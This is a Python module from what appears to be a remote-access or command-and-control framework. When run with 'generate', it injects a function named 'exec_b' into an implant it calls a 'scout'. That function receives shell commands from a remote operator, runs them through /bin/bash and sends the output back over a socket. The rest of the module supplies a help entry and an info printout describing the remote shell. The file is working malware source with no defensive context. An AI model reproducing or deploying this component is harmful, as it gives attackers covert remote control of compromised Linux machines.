import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('from subprocess import Popen, PIPE')
        config.import_statements.append('from os import chdir')
        config.functions.append('''
def exec_b(execute):
    execute = execute.split(' ',1)[1]
    if execute[:3] == 'cd ':
        execute = execute.replace('cd ', '', 1)
        chdir(execute)
        send_all(s,"[+]Changed to directory : " + execute)
    else:
        result = Popen(execute, executable='/bin/bash', shell=True, stdout=PIPE, stderr=PIPE,
                       stdin=PIPE)
        result = result.stdout.read() + result.stderr.read()        
        send_all(s,'[+]Command output : \\n' + result.decode())''')
        config.logics.append('''
            elif command == "exec_b":
                exec_b(data)''')
        config.help_menu[
            'exec_b <shell command>'] = 'A remote shell command execution component of the scout, it allows the scout to remotely execute commands using bash shell'
    elif option == 'info':
        print('\nName             : Execute command CMD component' \
              '\nOS               : Linux' \
              '\nRequired Modules : subprocess' \
              '\nCommands         : exec_b <shell command>' \
              '\nDescription      : A remote shell command execution component of the scout, it allows the scout to remotely execute commands using bash\n')
